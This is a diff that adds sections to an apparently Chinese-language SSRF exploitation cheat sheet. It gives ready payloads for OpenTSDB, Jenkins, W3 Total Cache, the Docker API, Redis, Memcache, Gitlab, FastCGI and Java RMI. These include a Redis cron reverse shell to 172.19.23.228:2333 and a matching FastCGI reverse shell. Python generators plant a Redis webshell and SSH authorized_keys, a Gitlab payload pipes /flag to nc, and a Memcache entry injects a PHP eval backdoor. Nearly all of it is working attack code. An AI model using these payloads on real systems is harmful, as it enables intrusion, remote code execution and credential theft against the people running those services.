@@ -339,3 +339,246 @@ CVE-2017-9506
 ```http
 /plugins/servlet/oauth/users/icon-uri?consumerUri=http://SSRF_CANARY
 ```
+
+### OpenTSDB
+
+常用绑定端口 4242
+
+curl RCE
+```http
+/q?start=2016/04/13-10:21:00&ignore=2&m=sum:jmxdata.cpu&o=&yrange=[0:]&key=out%20right%20top&wxh=1900x770%60curl%20SSRF_CANARY%60&style=linespoint&png
+```
+
+CVE-2020-35476
+```http
+/q?start=2016/04/13-10:21:00&ignore=2&m=sum:jmxdata.cpu&o=&yrange=[0:]&key=out%20right%20top&wxh=1900x770%60curl%20SSRF_CANARY%60&style=linespoint&png
+```
+
+### Jenkins
+
+常用绑定端口 80 443 8080 8888
+
+CVE-2018-1000600
+
+```http
+/securityRealm/user/admin/descriptorByName/org.jenkinsci.plugins.github.config.GitHubTokenCredentialsCreator/createTokenByPassword?apiUrl=http://SSRF_CANARY/%23&login=orange&password=tsai
+```
+
+RCE
+```http
+/org.jenkinsci.plugins.workflow.cps.CpsFlowDefinition/checkScriptCompile?value=@GrabConfig(disableChecksums=true)%0a@GrabResolver(name='orange.tw', root='http://SSRF_CANARY/')%0a@Grab(group='tw.orange', module='poc', version='1')%0aimport Orange;
+```
+
+Groovy RCE
+```http
+cmd = 'curl burp_collab'
+pay = 'public class x {public x(){"%s".execute()}}' % cmd
+data = 'http://jenkins.internal/descriptorByName/org.jenkinsci.plugins.scriptsecurity.sandbox.groovy.SecureGroovyScript/checkScript?sandbox=true&value=' + urllib.quote(pay)
+```
+
+### Hystrix Dashboard
+
+常用绑定端口 80 443 8080
+
+CVE-2020-5412
+```http
+/proxy.stream?origin=http://SSRF_CANARY/
+```
+
+### W3 Total Cache
+
+常用绑定端口 80 443
+
+CVE-2019-6715
+```http
+PUT /wp-content/plugins/w3-total-cache/pub/sns.php HTTP/1.1
+Host: {{Hostname}}
+Accept: */*
+User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.80 Safari/537.36
+Content-Length: 124
+Content-Type: application/x-www-form-urlencoded
+Connection: close
+
+{"Type":"SubscriptionConfirmation","Message":"","SubscribeURL":"https://SSRF_CANARY"}
+```
+
+此PHP代码将为SSRF Canary主机生成有效负载，替换URL为控制主机:
+```php
+<?php
+
+$url='http://www.google.com';
+$file=strtr(base64_encode(gzdeflate($url.'#https://ajax.googleapis.com')), '+/=', '-_');
+$file=chop($file,'=');
+$req='/wp-content/plugins/w3-total-cache/pub/minify.php?file='.$file.'.css';
+echo($req);
+
+?>
+```
+
+### Docker
+
+常用绑定端口 2375 2376
+
+验证Docker的API是否存在
+```http
+/containers/json
+/secrets
+/services
+```
+
+通过运行任意Docker镜像进行RCE
+```http
+POST /containers/create?name=test HTTP/1.1
+Host: website.com
+Content-Type: application/json
+...
+
+{"Image":"alpine", "Cmd":["/usr/bin/tail", "-f", "1234", "/dev/null"], "Binds": [ "/:/mnt" ], "Privileged": true}
+```
+
+### Gitlab Prometheus Redis Exporter
+
+常用绑定端口 9121
+
+该漏洞印象13.1.1之前版本的Gitlab实例，以下端点允许攻击者转储通过目标参数提供的Redis服务器中的所有密钥
+```http
+http://localhost:9121/scrape?target=redis://127.0.0.1:7001&check-keys=*
+```
+
+## Gopher
+
+### Redis
+
+常用绑定端口 6379
+
+Cron RCE
+```bash
+redis-cli -h $1 flushall
+echo -e "\n\n*/1 * * * * bash -i >& /dev/tcp/172.19.23.228/2333 0>&1\n\n"|redis-cli -h $1 -x set 1
+redis-cli -h $1 config set dir /var/spool/cron/
+redis-cli -h $1 config set dbfilename root
+redis-cli -h $1 save
+```
+
+Gopher
+```http
+gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$64%0d%0a%0d%0a%0a%0a*/1 * * * * bash -i >& /dev/tcp/172.19.23.228/2333 0>&1%0a%0a%0a%0a%0a%0d%0a%0d%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$16%0d%0a/var/spool/cron/%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$4%0d%0aroot%0d%0a*1%0d%0a$4%0d%0asave%0d%0aquit%0d%0a
+```
+
+通过shell上传进行RCE
+```python
+#!/usr/bin/env python
+# -*-coding:utf-8-*-
+
+import urllib
+protocol="gopher://"
+ip="192.168.189.208"
+port="6379"
+shell="\n\n<?php phpinfo();?>\n\n"
+filename="shell.php"
+path="/var"
+passwd=""
+
+cmd=["flushall",
+     "set 1 {}".format(shell.replace(" ","${IFS}")),
+     "config set dir {}".format(path),
+     "config set dbfilename {}".format(filename),
+     "save"
+     ]
+if passwd:
+    cmd.insert(0,"AUTH {}".format(passwd))
+payload=protocol+ip+":"+port+"/_"
+def redis_format(arr):
+    CRLF="\r\n"
+    redis_arr = arr.split(" ")
+    cmd=""
+    cmd+="*"+str(len(redis_arr))
+    for x in redis_arr:
+        cmd+=CRLF+"$"+str(len((x.replace("${IFS}"," "))))+CRLF+x.replace("${IFS}"," ")
+    cmd+=CRLF
+    return cmd
+
+if __name__=="__main__":
+    for x in cmd:
+        payload += urllib.quote(redis_format(x))
+    print payload
+```
+
+通过authorized_keys进行RCE
+```python
+import urllib
+protocol="gopher://"
+ip="192.168.189.208"
+port="6379"
+# shell="\n\n<?php eval($_GET[\"cmd\"]);?>\n\n"
+sshpublic_key = "\n\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC8IOnJUAt5b/5jDwBDYJTDULjzaqBe2KW3KhqlaY58XveKQRBLrG3ZV0ffPnIW5SLdueunb4HoFKDQ/KPXFzyvVjqByj5688THkq1RJkYxGlgFNgMoPN151zpZ+eCBdFZEf/m8yIb3/7Cp+31s6Q/DvIFif6IjmVRfWXhnkjNehYjsp4gIEBiiW/jWId5yrO9+AwAX4xSabbxuUyu02AQz8wp+h8DZS9itA9m7FyJw8gCrKLEnM7PK/ClEBevDPSR+0YvvYtnUxeCosqp9VrjTfo5q0nNg9JAvPMs+EA1ohUct9UyXbTehr1Bdv4IXx9+7Vhf4/qwle8HKali3feIZ root@kali\n\n"
+filename="authorized_keys"
+path="/root/.ssh/"
+passwd=""
+cmd=["flushall",
+     "set 1 {}".format(sshpublic_key.replace(" ","${IFS}")),
+     "config set dir {}".format(path),
+     "config set dbfilename {}".format(filename),
+     "save"
+     ]
+if passwd:
+    cmd.insert(0,"AUTH {}".format(passwd))
+payload=protocol+ip+":"+port+"/_"
+def redis_format(arr):
+    CRLF="\r\n"
+    redis_arr = arr.split(" ")
+    cmd=""
+    cmd+="*"+str(len(redis_arr))
+    for x in redis_arr:
+        cmd+=CRLF+"$"+str(len((x.replace("${IFS}"," "))))+CRLF+x.replace("${IFS}"," ")
+    cmd+=CRLF
+    return cmd
+
+if __name__=="__main__":
+    for x in cmd:
+        payload += urllib.quote(redis_format(x))
+    print payload
+```
+
+通过Git协议对Gitlab进行RCE
+```http
+git://[0:0:0:0:0:ffff:127.0.0.1]:6379/%0D%0A%20multi%0D%0A%20sadd%20resque%3Agitlab%3Aqueues%20system%5Fhook%5Fpush%0D%0A%20lpush%20resque%3Agitlab%3Aqueue%3Asystem%5Fhook%5Fpush%20%22%7B%5C%22class%5C%22%3A%5C%22GitlabShellWorker%5C%22%2C%5C%22args%5C%22%3A%5B%5C%22class%5Feval%5C%22%2C%5C%22open%28%5C%27%7Ccat%20%2Fflag%20%7C%20nc%20127%2E0%2E0%2E1%202222%5C%27%29%2Eread%5C%22%5D%2C%5C%22retry%5C%22%3A3%2C%5C%22queue%5C%22%3A%5C%22system%5Fhook%5Fpush%5C%22%2C%5C%22jid%5C%22%3A%5C%22ad52abc5641173e217eb2e52%5C%22%2C%5C%22created%5Fat%5C%22%3A1513714403%2E8122594%2C%5C%22enqueued%5Fat%5C%22%3A1513714403%2E8129568%7D%22%0D%0A%20exec%0D%0A%20exec%0D%0A/ssrf123321.git
+```
+
+### Memcache
+
+常用绑定端口 11211
+
+```http
+gopher://[target ip]:11211/_%0d%0aset ssrftest 1 0 147%0d%0aa:2:{s:6:"output";a:1:{s:4:"preg";a:2:{s:6:"search";s:5:"/.*/e";s:7:"replace";s:33:"eval(base64_decode($_POST[ccc]));";}}s:13:"rewritestatus";i:1;}%0d%0a
+gopher://192.168.10.12:11211/_%0d%0adelete ssrftest%0d%0a
+```
+
+### Apache Tomcat
+
+常用绑定端口 80 443 8080 8443
+
+仅对Tomcat6有效
+
+[Gopher-Tomcat-deployer](https://github.com/pimps/gopher-tomcat-deployer)
+
+### Fast CGI
+
+常用绑定端口 80 443
+
+```http
+gopher://127.0.0.1:9000/_%01%01%00%01%00%08%00%00%00%01%00%00%00%00%00%00%01%04%00%01%01%10%00%00%0F%10SERVER_SOFTWAREgo%20/%20fcgiclient%20%0B%09REMOTE_ADDR127.0.0.1%0F%08SERVER_PROTOCOLHTTP/1.1%0E%02CONTENT_LENGTH97%0E%04REQUEST_METHODPOST%09%5BPHP_VALUEallow_url_include%20%3D%20On%0Adisable_functions%20%3D%20%0Asafe_mode%20%3D%20Off%0Aauto_prepend_file%20%3D%20php%3A//input%0F%13SCRIPT_FILENAME/var/www/html/1.php%0D%01DOCUMENT_ROOT/%01%04%00%01%00%00%00%00%01%05%00%01%00a%07%00%3C%3Fphp%20system%28%27bash%20-i%20%3E%26%20/dev/tcp/172.19.23.228/2333%200%3E%261%27%29%3Bdie%28%27-----0vcdb34oju09b8fd-----%0A%27%29%3B%3F%3E%00%00%00%00%00%00%00
+```
+
+### Java RMI
+
+常用绑定端口 1090 1098 1099 1199 4443 4444 4445 4446 8999-9010 9999
+
+```bash
+$ rmg serial 127.0.0.1 1090 CommonsCollections6 'curl example.burpcollaborator.net' --component reg --ssrf --gopher
+[+] Creating ysoserial payload... done.
+[+]
+[+] Attempting deserialization attack on RMI Registry endpoint...
+[+]
+[+] 	SSRF Payload: gopher://127.0.0.1:1090/_%4a%52%4d%49%00%02%4c%50%ac%ed%00%05%77%22%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%02%44%15%4d[...]
+```
